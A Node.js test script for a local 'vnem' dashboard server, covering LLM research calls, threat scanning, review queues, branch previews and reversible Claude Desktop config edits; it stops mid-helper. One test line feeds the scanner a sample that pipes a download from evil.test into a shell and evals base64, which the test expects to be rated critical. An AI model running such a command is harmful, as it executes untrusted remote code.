#!/usr/bin/env node
import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, readFile, readdir, writeFile } from "node:fs/promises";
import http from "node:http";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const scriptDir = path.dirname(fileURLToPath(import.meta.url));
const rootDir = path.resolve(scriptDir, "..");
await mkdir(path.join(rootDir, ".tmp"), { recursive: true });
const tmpRoot = await mkdtemp(path.join(rootDir, ".tmp", "app-server-"));
const originalEnv = snapshotEnv();
const oldLocalWallet = "76ZuJidMzB32EQLLiCL8UPQATQFoY2mrqZa3Kvr8PZhp";
const newLocalWallet = "H62Ri1EExddxFKsLMn4nbmbxiCSxNRLtF8igPySLA23B";
const unknownLocalWallet = "UnknownWallet111111111111111111111111111111";
let server;

try {
  const appData = path.join(tmpRoot, "AppData", "Roaming");
  const localAppData = path.join(tmpRoot, "AppData", "Local");
  const home = path.join(tmpRoot, "Home");
  const programFiles = path.join(tmpRoot, "ProgramFiles");
  const programFilesX86 = path.join(tmpRoot, "ProgramFilesX86");
  Object.assign(process.env, {
    APPDATA: appData,
    LOCALAPPDATA: localAppData,
    HOME: home,
    USERPROFILE: home,
    XDG_CONFIG_HOME: path.join(home, ".config"),
    ProgramFiles: programFiles,
    "ProgramFiles(x86)": programFilesX86
  });

  const claudeConfigPath = path.join(appData, "Claude", "claude_desktop_config.json");
  await mkdir(path.dirname(claudeConfigPath), { recursive: true });
  const baseline = [
    "{",
    "  \"mcpServers\": {",
    "    \"existing-tool\": {",
    "      \"command\": \"node\",",
    "      \"args\": [\"existing.js\"],",
    "      \"env\": {",
    "        \"EXISTING_TOKEN\": \"keep-this-secret-value\"",
    "      }",
    "    }",
    "  }",
    "}",
    ""
  ].join("\n");
  await writeFile(claudeConfigPath, baseline, "utf8");

  const moduleUrl = `${pathToFileURL(path.join(rootDir, "scripts", "vnem-app-server.mjs")).href}?test=${Date.now()}`;
  const {
    callOpenRouterJson,
    getAppServerStatus,
    researchLiveRepositoryCandidate,
    runGivingStaging,
    runProtectionScan,
    scanThreatSignatures,
    startVnemAppServer
  } = await import(moduleUrl);
  process.env.OPENROUTER_API_KEY = "test-openrouter-key";
  const openRouterCapture = { body: null, headers: null };
  const openRouterJson = await callOpenRouterJson({
    stage: "research",
    fetchImpl: async (_url, init) => {
      openRouterCapture.body = JSON.parse(init.body);
      openRouterCapture.headers = init.headers;
      return jsonFetchResponse({
        choices: [
          {
            message: {
              content: JSON.stringify({
                title: "Hermes-generated candidate",
                description: "LLM structured research result.",
                source_route: "github-search",
                candidate_score: 88
              })
            }
          }
        ]
      });
    },
    messages: [{ role: "user", content: "test" }]
  });
  assert.equal(openRouterJson.ok, true);
  assert.equal(openRouterJson.json.candidate_score, 88);
  assert.equal(openRouterCapture.body.model, "nousresearch/hermes-3-llama-3.1-405b:free");
  assert.deepEqual(openRouterCapture.body.response_format, { type: "json_object" });
  assert.match(openRouterCapture.headers.Authorization, /^Bearer test-openrouter-key/);

  let openRouterLimitedAttempts = 0;
  const observedBackoffSleeps = [];
  const openRouterLimited = await callOpenRouterJson({
    stage: "research",
    fetchImpl: async () => {
      openRouterLimitedAttempts += 1;
      if (openRouterLimitedAttempts === 1) {
        return jsonFetchResponse({ error: { message: "limited" } }, 429, { "retry-after": "12" });
      }
      return jsonFetchResponse({
        choices: [
          {
            message: {
              content: JSON.stringify({ recovered: true, stage: "research" })
            }
          }
        ]
      });
    },
    messages: [{ role: "user", content: "test" }],
    sleepImpl: async (delayMs) => observedBackoffSleeps.push(delayMs)
  });
  assert.equal(openRouterLimited.ok, true);
  assert.deepEqual(openRouterLimited.json, { recovered: true, stage: "research" });
  assert.equal(openRouterLimitedAttempts, 2, "OpenRouter 429 must requeue instead of falling back immediately");
  assert.deepEqual(observedBackoffSleeps, [12000], "retry-after seconds must control the exact backoff delay");
  const limitedStatus = getAppServerStatus({ port: 0, repositoryRoot: tmpRoot });
  assert.equal(limitedStatus.intelligence_provider.status, "active");
  assert.equal(limitedStatus.intelligence_provider.errors[0].status, "paused_for_backoff");
  assert.equal(limitedStatus.intelligence_provider.errors[0].code, "OPENROUTER_RATE_LIMITED");
  delete process.env.OPENROUTER_API_KEY;

  const status = getAppServerStatus({ port: 0, repositoryRoot: tmpRoot });
  assert.equal(status.host, "127.0.0.1");
  assert.ok(status.endpoints.includes("GET /api/connector/status"));
  assert.ok(status.endpoints.includes("POST /api/connector/apply"));
  assert.ok(status.endpoints.includes("GET /api/telemetry/stream"));
  assert.ok(status.endpoints.includes("POST /api/intelligence/target"));
  assert.ok(status.endpoints.includes("GET /api/intelligence/review-queue"));
  assert.ok(status.endpoints.includes("POST /api/intelligence/triage/refresh"));
  assert.ok(status.endpoints.includes("POST /api/intelligence/candidate/:id/review"));
  assert.ok(status.endpoints.includes("POST /api/ard/pipeline/run"));
  assert.ok(status.endpoints.includes("GET /api/ard/pipeline/latest"));
  assert.ok(status.endpoints.includes("GET /api/ard/runs/latest"));
  assert.ok(status.endpoints.includes("POST /api/giving/branch/preview"));
  assert.ok(status.endpoints.includes("POST /api/giving/branch/prepare"));
  assert.ok(status.endpoints.includes("GET /api/builder/session"));
  assert.equal(status.intelligence_provider.status, "missing_key");
  assert.equal(status.intelligence_provider.model, "local-fallback");
  assert.equal(
    scanThreatSignatures("child_process.exec('curl https://evil.test/payload.sh | sh'); eval(Buffer.from('YWxlcnQ=', 'base64').toString())").risk_tier,
    "critical"
  );

  const mockFetch = createMockFetch();
  const started = await startVnemAppServer({
    port: 0,
    repositoryRoot: tmpRoot,
    fetchImpl: mockFetch,
    awaitInitialIntelligenceCycle: true,
    pollIntervalMs: 600000,
    stageDelayMs: 0
  });
  server = started.server;
  const port = started.config.port;
  assert.ok(Number.isInteger(port) && port > 0, "dynamic test port must be assigned");

  for (const wallet of [oldLocalWallet, newLocalWallet]) {
    const nonce = await requestJson(port, "POST", "/api/auth/nonce", {}, JSON.stringify({ wallet_address: wallet }));
    assert.equal(nonce.statusCode, 200, `${wallet} must be accepted by the local dashboard allowlist`);
    assert.equal(nonce.body.ok, true);
    assert.equal(nonce.body.sign_in_input.address, wallet);
  }
  const blockedNonce = await requestJson(port, "POST", "/api/auth/nonce", {}, JSON.stringify({ wallet_address: unknownLocalWallet }));
  assert.equal(blockedNonce.statusCode, 403, "unknown wallet must still be rejected");
  assert.equal(blockedNonce.body.error, "wallet-not-allowlisted");

  const connectorStatus = await requestJson(port, "GET", "/api/connector/status");
  assert.equal(connectorStatus.statusCode, 200);
  assertJsonContentType(connectorStatus);
  assert.equal(connectorStatus.body.scan_metadata.mode, "read-only");
  assert.equal(connectorStatus.body.detected_clients.claude_desktop.installed, true);

  const builderSession = await requestJson(port, "GET", "/api/builder/session");
  assert.equal(builderSession.statusCode, 200);
  assertJsonContentType(builderSession);
  assert.equal(builderSession.body.ok, true);
  assert.equal(builderSession.body.branch, "main");
  assert.equal(Array.isArray(builderSession.body.devHealth.ports), true);
  assert.equal(builderSession.body.devHealth.ports.some((entry) => entry.port === 9099), true);

  const telemetryHistory = await requestJson(port, "GET", "/api/telemetry/history");
  assert.equal(telemetryHistory.statusCode, 200);
  assertJsonContentType(telemetryHistory);
  assert.equal(Array.isArray(telemetryHistory.body.active_ingestions), true);
  assert.ok(telemetryHistory.body.active_ingestions.length > 0, "live intelligence engine must expose baseline ingestions");
  assert.equal(telemetryHistory.body.active_ingestions[0].title, "ovvuh/vnem-agent-workflow");
  assert.equal(telemetryHistory.body.active_ingestions[0].current_agent, "complete", JSON.stringify({ status: telemetryHistory.body.active_ingestions[0].status, verdict: telemetryHistory.body.active_ingestions[0].pipeline_verdict, report: telemetryHistory.body.active_ingestions[0].protection_report }, null, 2));
  assert.equal(telemetryHistory.body.active_ingestions[0].status, "staged_for_review");
  assert.equal(telemetryHistory.body.active_ingestions[0].threat_score < 30, true);
  assert.equal(Array.isArray(telemetryHistory.body.route_errors), true);
  assert.equal(telemetryHistory.body.intelligence_provider.status, "missing_key");
  assert.equal(telemetryHistory.body.intelligence_provider.model, "local-fallback");
  assert.equal(telemetryHistory.body.mission.vector, "github");
  assert.equal(telemetryHistory.body.review_queue.ok, true);
  assert.equal(telemetryHistory.body.review_queue.branchEligible >= 1, true);
  assert.equal(Array.isArray(telemetryHistory.body.review_queue.topBranchCandidates), true);
  assert.equal(Array.isArray(telemetryHistory.body.branch_candidate_set.branchEligibleCandidates), true);
  assert.equal(telemetryHistory.body.branch_candidate_set.canPreviewBranch, true);
  assert.equal(mockFetch.calls.some((url) => url.startsWith("https://api.github.com/search/repositories")), true);
  assert.equal(mockFetch.calls.some((url) => url.endsWith("/README.md")), true);

  const browserPipeline = await requestJson(port, "POST", "/api/ard/pipeline/run", {}, JSON.stringify({
    run_id: "ard-browser-pipeline-test",
    mission: "ARD Browser Pipeline v1 route test",
    push_mode: "fixture-remote"
  }));
  assert.equal(browserPipeline.statusCode, 200);
  assertJsonContentType(browserPipeline);
  assert.equal(browserPipeline.body.ok, true);
  assert.equal(browserPipeline.body.schema, "vnem.ardBrowserPipeline.v1");
  assert.equal(browserPipeline.body.runId, "ard-browser-pipeline-test");
  assert.equal(browserPipeline.body.research.status, "completed");
  assert.equal(browserPipeline.body.research.candidatesFound, 4);
  assert.equal(browserPipeline.body.protection.allowed, 1);
  assert.equal(browserPipeline.body.protection.dangerousFindings.length >= 1, true, "Dangerous findings must stay visible");
  assert.equal(browserPipeline.body.protection.dangerousFindings.some((finding) => finding.excludedFromGiving === true), true);
  assert.equal(browserPipeline.body.giving.pushMode, "fixture-remote");
  assert.equal(browserPipeline.body.giving.pushed, true);
  assert.equal(browserPipeline.body.giving.branchName.startsWith("vnem-research/"), true);
  assert.equal(browserPipeline.body.branch.mode, "fixture-remote");
  assert.equal(browserPipeline.body.branch.pushed, true);
  assert.equal(browserPipeline.body.nextAction.includes("Review"), true);
  assert.equal(existsSync(path.join(tmpRoot, "discovery", "ard-runs", "ard-browser-pipeline-test", "demo-summary.json")), true);
  assert.equal(existsSync(path.join(tmpRoot, "discovery", "ard-runs", "ard-browser-pipeline-test", "dangerous-findings.md")), true);

  const latestBrowserPipeline = await requestJson(port, "GET", "/api/ard/pipeline/latest");
  assert.equal(latestBrowserPipeline.statusCode, 200);
  assert.equal(latestBrowserPipeline.body.ok, true);
  assert.equal(latestBrowserPipeline.body.pipeline.runId, "ard-browser-pipeline-test");

  const latestBrowserRunAlias = await requestJson(port, "GET", "/api/ard/runs/latest");
  assert.equal(latestBrowserRunAlias.statusCode, 200);
  assert.equal(latestBrowserRunAlias.body.ok, true);
  assert.equal(latestBrowserRunAlias.body.pipeline.runId, "ard-browser-pipeline-test");
  assert.equal(latestBrowserRunAlias.body.pipeline.branch.mode, "fixture-remote");

  const browserPipelineHistory = await requestJson(port, "GET", "/api/telemetry/history");
  assert.equal(browserPipelineHistory.body.ard_browser_pipeline.runId, "ard-browser-pipeline-test");
  assert.equal(browserPipelineHistory.body.active_ingestions.some((item) => item.id === "ard-browser-pipeline-test:clean-dashboard-launcher"), true);
  assert.equal(browserPipelineHistory.body.active_ingestions.some((item) => item.id === "ard-browser-pipeline-test:token-stealing-postinstall-kit" && item.status === "isolated_by_protection"), true);

  const stagingFiles = await readdir(path.join(tmpRoot, ".vnem", "staging"));
  assert.equal(stagingFiles.length, 1, "Giving AI must stage exactly one dispatch file for the safe mocked repository");
  const stagedDispatch = await readFile(path.join(tmpRoot, ".vnem", "staging", stagingFiles[0]), "utf8");
  assert.match(stagedDispatch, /VNEM Live Intelligence Dispatch: ovvuh\/vnem-agent-workflow/);
  assert.match(stagedDispatch, /Threat score: 0%/);

  const branchPreview = await requestJson(port, "POST", "/api/giving/branch/preview", {}, JSON.stringify({
    sourceMissionId: "mission-dashboard-ai-engine",
    missionTitle: "Improve dashboard AI mission engine",
    branchName: "vnem-giving/dashboard-ai-mission-engine",
    baseBranch: "main",
    includedCandidates: [
      {
        id: "ingestion-allowed",
        title: "Allowed dashboard mission candidate",
        verdict: "allow",
        sourceRoute: "github-search"
      }
    ],
    excludedCandidates: [
      {
        id: "ingestion-blocked",
        title: "Blocked unsafe candidate",
        verdict: "blocked",
        sourceRoute: "npm-search"
      }
    ],
    validationCommands: ["npm run test:dashboard-missions"]
  }));
  assert.equal(branchPreview.statusCode, 200);
  assert.equal(branchPreview.body.ok, true);
  assert.equal(branchPreview.body.mode, "preview");
  assert.equal(branchPreview.body.branchName, "vnem-giving/dashboard-ai-mission-engine");
  assert.equal(branchPreview.body.baseBranch, "main");
  assert.equal(branchPreview.body.pushStatus, "not-pushed");
  assert.equal(branchPreview.body.reviewStatus, "waiting-for-manual-review");
  assert.equal(branchPreview.body.blockedCandidateIds.includes("ingestion-blocked"), true);

  const invalidBranchPreview = await requestJson(port, "POST", "/api/giving/branch/preview", {}, JSON.stringify({
    sourceMissionId: "mission-dashboard-ai-engine",
    branchName: "feature/not-allowed",
    baseBranch: "main",
    includedCandidates: [{ id: "candidate", title: "Candidate", verdict: "allow" }]
  }));
  assert.equal(invalidBranchPreview.statusCode, 400);
  assert.equal(invalidBranchPreview.body.error_code, "GIVING_BRANCH_PLAN_INVALID");

  const unconfirmedPrepare = await requestJson(port, "POST", "/api/giving/branch/prepare", {}, JSON.stringify({
    sourceMissionId: "mission-dashboard-ai-engine",
    branchName: "vnem-giving/dashboard-ai-mission-engine",
    baseBranch: "main",
    includedCandidates: [{ id: "candidate", title: "Candidate", verdict: "allow" }]
  }));
  assert.equal(unconfirmedPrepare.statusCode, 400);
  assert.equal(unconfirmedPrepare.body.error_code, "GIVING_BRANCH_CONFIRMATION_REQUIRED");
  assert.equal(unconfirmedPrepare.body.pushStatus, "not-pushed");

  const baselineDispatchId = telemetryHistory.body.active_ingestions[0].id;
  const reviewQueueResponse = await requestJson(port, "GET", "/api/intelligence/review-queue");
  assert.equal(reviewQueueResponse.statusCode, 200);
  assert.equal(reviewQueueResponse.body.ok, true);
  assert.equal(reviewQueueResponse.body.branchEligible >= 1, true);
  const triageRefresh = await requestJson(port, "POST", "/api/intelligence/triage/refresh");
  assert.equal(triageRefresh.statusCode, 200);
  assert.equal(triageRefresh.body.ok, true);
  const malformedCandidateReview = await requestJson(port, "POST", `/api/intelligence/candidate/${encodeURIComponent(baselineDispatchId)}/review`, {}, JSON.stringify({
    decision: "ship-it",
    notes: "invalid"
  }));
  assert.equal(malformedCandidateReview.statusCode, 400);
  assert.equal(malformedCandidateReview.body.error_code, "CANDIDATE_REVIEW_REJECTED");
  const missingCandidateReview = await requestJson(port, "POST", "/api/intelligence/candidate/not-present/review", {}, JSON.stringify({
    decision: "keep-reviewing"
  }));
  assert.equal(missingCandidateReview.statusCode, 404);
  assert.equal(missingCandidateReview.body.error_code, "CANDIDATE_NOT_FOUND");
  const dispatchReview = await requestJson(port, "GET", `/api/intelligence/dispatch/${encodeURIComponent(baselineDispatchId)}`);
  assert.equal(dispatchReview.statusCode, 200);
  assert.equal(dispatchReview.body.dispatch.id, baselineDispatchId);
  assert.equal(dispatchReview.body.dispatch.file_name, stagingFiles[0]);
  assert.match(dispatchReview.body.markdown, /VNEM Live Intelligence Dispatch: ovvuh\/vnem-agent-workflow/);

  const approveDispatch = await requestJson(port, "POST", `/api/intelligence/dispatch/${encodeURIComponent(baselineDispatchId)}/approve`);
  assert.equal(approveDispatch.statusCode, 200);
  assert.equal(approveDispatch.body.status, "completed");
  assert.equal(approveDispatch.body.dispatch.approved_file_name, stagingFiles[0]);
  assert.equal(existsSync(path.join(tmpRoot, ".vnem", "staging", stagingFiles[0])), false, "approve must remove staged file");
  assert.equal(existsSync(path.join(tmpRoot, ".vnem", "approved", stagingFiles[0])), true, "approve must move dispatch to approved");
  const approvedHistory = await requestJson(port, "GET", "/api/telemetry/history");
  assert.equal(approvedHistory.body.active_ingestions[0].id, baselineDispatchId);
  assert.equal(approvedHistory.body.active_ingestions[0].status, "completed");
  assert.equal(approvedHistory.body.active_ingestions[0].action_dispatch, "Approved");
  const candidateReview = await requestJson(port, "POST", `/api/intelligence/candidate/${encodeURIComponent(baselineDispatchId)}/review`, {}, JSON.stringify({
    decision: "keep-reviewing",
    notes: "Route test: keep review record only.",
    reviewedBy: "manual-owner"
  }));
  assert.equal(candidateReview.statusCode, 200);
  assert.equal(candidateReview.body.ok, true);
  assert.equal(candidateReview.body.review.decision, "keep-reviewing");
  assert.equal(existsSync(path.join(tmpRoot, "discovery", "reviews", `${baselineDispatchId}.json`)), true, "candidate review route must write safe local JSON record");
  assert.equal(candidateReview.body.review_queue.ok, true);

  const target = await requestJson(port, "POST", "/api/intelligence/target", {}, JSON.stringify({
    query: "rust entity component system",
    vector: "github",
    threat_tolerance: 50
  }));
  assert.equal(target.statusCode, 202);
  assertJsonContentType(target);
  assert.equal(target.body.status, "retargeted");
  assert.equal(target.body.cycle_status, "started");
  assert.equal(target.body.mission.query, "rust entity component system");
  assert.equal(target.body.mission.vector, "github");
  assert.equal(target.body.mission.threat_tolerance, 50);

  const retargetedHistory = await waitForTelemetryHistory(port, (body) => (
    body.mission?.query === "rust entity component system" &&
    body.pipeline?.mission?.threat_tolerance === 50 &&
    body.active_ingestions?.[0]?.title === "bevyengine/bevy" &&
    body.active_ingestions?.[0]?.status === "awaiting_manual_review"
  ));
  const bevyCandidate = retargetedHistory.body.active_ingestions[0];
  assert.equal(bevyCandidate.repository.query, "rust entity component system");
  assert.equal(bevyCandidate.status, "awaiting_manual_review");
  assert.equal(bevyCandidate.pipeline_verdict, "needs-review");
  assert.equal(bevyCandidate.protection_report.verdict, "needs-review");
  assert.equal(bevyCandidate.protection_report.block_threshold, 50);
  assert.equal(bevyCandidate.staged_dispatch ?? null, null, "missing-license candidates must not auto-stage a Giving dispatch");
  assert.equal(retargetedHistory.body.review_queue.topReviewCandidates.some((item) => item.id === bevyCandidate.id), true, "missing-license Bevy candidate should be surfaced for manual review");
  assert.equal(retargetedHistory.body.branch_candidate_set.branchEligibleCandidates.some((item) => item.id === bevyCandidate.id), false, "unreviewed needs-review candidate must not be branch-eligible");
  assert.equal(retargetedHistory.body.branch_candidate_set.excludedCandidates.some((item) => item.id === bevyCandidate.id && item.verdict === "needs-review"), true);
  assert.equal(mockFetch.calls.some((url) => url.includes("q=rust+entity+component+system")), true);

  const bevyDispatchId = bevyCandidate.id;
  const bevyReview = await requestJson(port, "POST", `/api/intelligence/candidate/${encodeURIComponent(bevyDispatchId)}/review`, {}, JSON.stringify({
    decision: "approve-for-giving",
    notes: "Manual owner reviewed source, license situation, permissions, and install surface.",
    reviewedBy: "manual-owner"
  }));
  assert.equal(bevyReview.statusCode, 200);
  assert.equal(bevyReview.body.ok, true);
  assert.equal(bevyReview.body.review.decision, "approve-for-giving");
  assert.equal(bevyReview.body.review.reviewSatisfied, true);
  assert.equal(existsSync(path.join(tmpRoot, "discovery", "reviews", `${bevyDispatchId}.json`)), true, "manual review must write a safe local JSON record");
  assert.equal(bevyReview.body.review_queue.topReviewCandidates.some((item) => item.id === bevyDispatchId), false, "review-satisfied Bevy should leave the top review queue");
  assert.equal(bevyReview.body.review_queue.branchEligible >= 1, true);
  assert.equal(bevyReview.body.review_queue.branchCandidateSet.branchEligibleCandidates.some((item) => item.id === bevyDispatchId), true, "review-satisfied needs-review candidate should become branch-eligible");

  const reviewedHistory = await requestJson(port, "GET", "/api/telemetry/history");
  assert.equal(reviewedHistory.body.branch_candidate_set.branchEligibleCandidates.some((item) => item.id === bevyDispatchId), true);
  assert.equal(reviewedHistory.body.active_ingestions.some((item) => item.id === bevyDispatchId && item.status === "review_satisfied"), true);

  const npmTarget = await requestJson(port, "POST", "/api/intelligence/target", {}, JSON.stringify({
    query: "agentic workflow",
    vector: "npm",
    threat_tolerance: 30
  }));
  assert.equal(npmTarget.statusCode, 202);
  assert.equal(npmTarget.body.mission.vector, "npm");
  assert.equal(npmTarget.body.mission.vector_label, "NPM Package Registry");

  const npmHistory = await waitForTelemetryHistory(port, (body) => (
    body.mission?.vector === "npm" &&
    body.active_ingestions?.[0]?.source_route === "npm-search" &&
    body.active_ingestions?.[0]?.status === "awaiting_manual_review"
  ));
  const npmIngestion = npmHistory.body.active_ingestions[0];
  assert.equal(npmIngestion.title, "vnem-agent-runner");
  assert.equal(npmIngestion.pipeline_verdict, "needs-review");
  assert.equal(Boolean(npmIngestion.review_satisfied), false);
  assert.equal(npmHistory.body.branch_candidate_set.branchEligibleCandidates.some((item) => item.id === npmIngestion.id), false, "unreviewed missing-license NPM package must not be branch-eligible");
  assert.equal(npmIngestion.repository.kind, "npm_package");
  assert.equal(npmIngestion.repository.vector, "npm");
  assert.equal(npmIngestion.repository.diagnostics.score_components.search_score, 0.96);
  assert.equal(npmIngestion.repository.diagnostics.score_components.quality, 0.91);
  assert.equal(npmIngestion.repository.diagnostics.score_components.popularity, 0.72);
  assert.equal(npmIngestion.repository.diagnostics.metadata_source, "NPM Registry /-/v1/search");
  assert.equal(npmIngestion.protection_report.fetched_assets[0].label, "npm-search-metadata");
  assert.equal(npmIngestion.threat_score < 30, true);
  assert.equal(mockFetch.calls.some((url) => url.startsWith("https://registry.npmjs.org/-/v1/search")), true);

  const mcpTarget = await requestJson(port, "POST", "/api/intelligence/target", {}, JSON.stringify({
    query: "agentic workflow mcp",
    vector: "mcp",
    threat_tolerance: 30
  }));
  assert.equal(mcpTarget.statusCode, 202);
  assert.equal(mcpTarget.body.mission.vector, "mcp");
  const mcpHistory = await waitForTelemetryHistory(port, (body) => (
    body.mission?.vector === "mcp" &&
    body.active_ingestions?.[0]?.source_route === "mcp-registry" &&
    body.active_ingestions?.[0]?.status === "awaiting_manual_review"
  ));
  assert.match(mcpHistory.body.active_ingestions[0].title, /agentic workflow mcp MCP server/);
  assert.equal(mcpHistory.body.active_ingestions[0].pipeline_verdict, "needs-review");
  assert.equal(mcpHistory.body.branch_candidate_set.branchEligibleCandidates.some((item) => item.id === mcpHistory.body.active_ingestions[0].id), false, "unreviewed MCP catalog lead must not be branch-eligible");
  assert.equal(mcpHistory.body.active_ingestions[0].repository.kind, "mcp_tool");
  assert.equal(mcpHistory.body.active_ingestions[0].repository.adapter.mode, "deterministic-local");
  assert.equal(mcpHistory.body.active_ingestions[0].repository.diagnostics.route, "mcp-registry");

  const invalidTarget = await requestJson(port, "POST", "/api/intelligence/target", {}, JSON.stringify({
    query: "x",
    threat_tolerance: 30
  }));
  assert.equal(invalidTarget.statusCode, 400);
  assertJsonContentType(invalidTarget);
  assert.equal(invalidTarget.body.error_code, "QUERY_TOO_SHORT");

  const invalidVector = await requestJson(port, "POST", "/api/intelligence/target", {}, JSON.stringify({
    query: "agent workflow",
    vector: "unknown",
    threat_tolerance: 30
  }));
  assert.equal(invalidVector.statusCode, 400);
  assert.equal(invalidVector.body.error_code, "INVALID_INTELLIGENCE_VECTOR");

  const telemetry = await requestTelemetry(port);
  assert.equal(telemetry.statusCode, 200);
  assert.match(String(telemetry.headers["content-type"] || ""), /^text\/event-stream(?:;|$)/);
  assert.equal(telemetry.headers["cache-control"], "no-cache");
  assert.equal(telemetry.headers.connection, "keep-alive");
  assert.equal(telemetry.event.type, "connected");
  assert.equal(telemetry.event.message, "Telemetry bridge active");

  const preview = await requestJson(port, "GET", "/api/connector/preview");
  assert.equal(preview.statusCode, 200);
  assertJsonContentType(preview);
  assert.equal(preview.body.preview_metadata.mode, "read-only-preview");
  assert.equal(preview.body.preview_metadata.writes_performed, false);
  assert.ok(preview.body.previews.claude_desktop.target_config_state.mcpServers.vnem);
  assert.equal(JSON.stringify(preview.body).includes("keep-this-secret-value"), false, "preview output must redact secrets");

  const apply = await requestJson(port, "POST", "/api/connector/apply");
  assert.equal(apply.statusCode, 200);
  assertJsonContentType(apply);
  assert.equal(apply.body.mode, "apply");
  assert.equal(apply.body.results.claude_desktop.action, "applied");
  assert.equal(existsSync(`${claudeConfigPath}.vnem.bak`), true, "apply must create an adjacent backup");

  const modified = JSON.parse(await readFile(claudeConfigPath, "utf8"));
  assert.equal(modified.mcpServers["existing-tool"].env.EXISTING_TOKEN, "keep-this-secret-value");
  assert.ok(modified.mcpServers.vnem);
  assert.ok(modified.mcpServers["vnem-precision"]);

  const rollback = await requestJson(port, "POST", "/api/connector/rollback");
  assert.equal(rollback.statusCode, 200);
  assertJsonContentType(rollback);
  assert.equal(rollback.body.mode, "rollback");
  assert.equal(rollback.body.results.claude_desktop.action, "rolled-back");
  assert.equal(await readFile(claudeConfigPath, "utf8"), baseline, "rollback must restore the baseline byte-for-byte");
  assert.equal(existsSync(`${claudeConfigPath}.vnem.bak`), false, "rollback must remove the adjacent backup");

  const spoofedHost = await requestJson(port, "GET", "/api/connector/status", {
    Host: "192.168.1.50"
  });
  assert.equal(spoofedHost.statusCode, 403);
  assertJsonContentType(spoofedHost);
  assert.equal(spoofedHost.body.error, "local-only-request-rejected");

  const externalOrigin = await requestJson(port, "GET", "/api/connector/status", {
    Origin: "https://example.com"
  });
  assert.equal(externalOrigin.statusCode, 403);
  assertJsonContentType(externalOrigin);
  assert.equal(externalOrigin.body.reason, "non-local-origin-header");

  process.env.OPENROUTER_API_KEY = "test-openrouter-key";
  const llmFetch = createOpenRouterPipelineMockFetch();
  const llmResearch = await researchLiveRepositoryCandidate({
    fetchImpl: llmFetch,
    force: true,
    query: "openrouter llm orchestration",
    vector: "github",
    pollIntervalMs: 600000
  });
  assert.equal(llmResearch.title, "Hermes LLM Candidate");
  assert.equal(llmResearch.trust_score, 91);
  assert.equal(llmResearch.repository.llm_research.model, "nousresearch/hermes-3-llama-3.1-405b:free");

  const llmProtection = await runProtectionScan(llmResearch, {
    fetchImpl: llmFetch,
    threatTolerance: 30
  });
  assert.equal(llmProtection.threat_score, 12);
  assert.deepEqual(llmProtection.protection_report.flags, ["clean-metadata"]);
  assert.equal(llmProtection.protection_report.model_provider, "openrouter");

  const llmDispatch = await runGivingStaging(llmProtection, {
    repositoryRoot: tmpRoot,
    fetchImpl: llmFetch
  });
  const llmDispatchMarkdown = await readFile(llmDispatch.staged_dispatch.path, "utf8");
  assert.match(llmDispatchMarkdown, /# Hermes LLM Candidate/);
  assert.match(llmDispatchMarkdown, /Generated by: OpenRouter/);
  delete process.env.OPENROUTER_API_KEY;

  console.log("vnem app server tests passed");
} finally {
  if (server) {
    await closeServer(server);
  }
  restoreEnv(originalEnv);
}

function requestJson(port, method, route, headers = {}, body = null) {
  const requestHeaders = {
    Host: `127.0.0.1:${port}`,
    ...headers
  };
  if (body != null) {
    requestHeaders["content-type"] = requestHeaders["content-type"] ?? "application/json";
    requestHeaders["content-length"] = Buffer.byteLength(body);
  }

  return new Promise((resolve, reject) => {
    const request = http.request(
      {
        hostname: "127.0.0.1",
        port,
        path: route,
        method,
        headers: requestHeaders
      },
      (response) => {
        let text = "";
        response.setEncoding("utf8");
        response.on("data", (chunk) => {
          text += chunk;
        });
        response.on("end", () => {
          try {
            resolve({
              statusCode: response.statusCode,
              headers: response.headers,
              text,
              body: JSON.parse(text)
            });
          } catch (error) {
            reject(new Error(`Response was not valid JSON: ${error.message}; body=${text}`));
          }
        });
      }
    );
    request.on("error", reject);
    if (body != null) {
      request.write(body);
    }
    request.end();
  });
}

function requestTelemetry(port) {
  return new Promise((resolve, reject) => {
    let settled = false;
    const request = http.request(
      {
        hostname: "127.0.0.1",
        port,
        path: "/api/telemetry/stream",
        method: "GET",
        headers: {
          Host: `127.0.0.1:${port}`,
          Origin: "http://127.0.0.1:4174",
          Accept: "text/event-stream"
        }
      },
      (response) => {
        let text = "";
        response.setEncoding("utf8");
        response.on("data", (chunk) => {
          text += chunk;
          if (!settled && text.includes("\n\n")) {
            settled = true;
            response.destroy();
            resolve({
              statusCode: response.statusCode,
              headers: response.headers,
              text,
              event: parseSseData(text)
            });
          }
        });
      }
    );
    request.on("error", (error) => {
      if (!settled) {
        reject(error);
      }
    });
    request.end();
  });
}

function parseSseData(text) {
  const line = text.split(/\r?\n/).find((item) => item.startsWith("data: "));
  assert.ok(line, `SSE response must contain a data line: ${text}`);
  return JSON.parse(line.slice("data: ".length));
}

function assertJsonContentType(response) {
  assert.match(String(response.headers["content-type"] || ""), /^application\/json(?:;|$)/);
}

async function waitForTelemetryHistory(port, predicate) {
  const deadline = Date.now() + 1500;
  let latest = null;
  while (Date.now() < deadline) {
    latest = await requestJson(port, "GET", "/api/telemetry/history");
    if (predicate(latest.body)) {
      return latest;
    }
    await new Promise((resolve) => setTimeout(resolve, 20));
  }
  throw new Error(`Timed out waiting for telemetry history condition. Latest=${JSON.stringify(latest?.body)}`);
}

function closeServer(targetServer) {
  return new Promise((resolve, reject) => {
    targetServer.close((error) => {
      if (error) {
        reject(error);
      } else {
        resolve();
      }
    });
  });
}

function snapshotEnv() {
  const keys = ["APPDATA", "LOCALAPPDATA", "HOME", "USERPROFILE", "XDG_CONFIG_HOME", "ProgramFiles", "ProgramFiles(x86)", "OPENROUTER_API_KEY"];
  return Object.fromEntries(keys.map((key) => [key, process.env[key]]));
}

function restoreEnv(snapshot) {
  for (const [key, value] of Object.entries(snapshot)) {
    if (value == null) {
      delete process.env[key];
    } else {
      process.env[key] = value;
    }
  }
}

function createMockFetch() {
  const calls = [];
  const mockFetch = async (url) => {
    const target = String(url);
    calls.push(target);
    if (target.startsWith("https://api.github.com/search/repositories")) {
      const query = new URL(target).searchParams.get("q");
      if (query === "rust entity component system") {
        return jsonFetchResponse({
          total_count: 1,
          incomplete_results: false,
          items: [
            {
              id: 300,
              name: "bevy",
              full_name: "bevyengine/bevy",
              html_url: "https://github.com/bevyengine/bevy",
              description: "A refreshingly simple data-driven game engine built in Rust with entity component system architecture.",
              owner: { login: "bevyengine" },
              default_branch: "main",
              stargazers_count: 45000,
              forks_count: 4500,
              language: "Rust",
